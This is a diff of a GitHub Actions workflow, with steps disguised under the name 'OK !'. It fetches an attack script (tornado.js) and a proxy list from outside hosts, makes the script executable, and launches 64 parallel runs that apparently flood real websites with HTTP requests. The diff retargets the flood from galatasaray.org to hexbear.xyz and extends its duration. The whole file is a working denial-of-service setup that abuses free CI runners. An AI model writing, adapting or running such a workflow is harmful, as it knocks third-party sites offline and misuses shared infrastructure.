@@ -16,12 +16,12 @@ jobs:
       - name: OK !
         run: |
           wget https://github.com/kaneious/tornado/raw/refs/heads/main/tornado.js
-          wget https://curl.by/taZAz/proxies.txt
+          wget https://curl.by/LM2U8/proxies.txt
           npm i hpack
           chmod +x tornado.js
           PIDS=()
           for i in {1..64}; do
-            timeout 70 node tornado.js GET https://www.galatasaray.org/anasayfa 70 9 90 proxies.txt --full --query 3
+            timeout 150 node tornado.js GET https://hexbear.xyz/ 150 9 90 proxies.txt --full --query 3
             PIDS+=($!)
           done
           
@@ -30,7 +30,7 @@ jobs:
           done
 
       - name: OK !
-        run: sleep 70
+        run: sleep 150
         
       - name: OK !
         run: sudo reboot
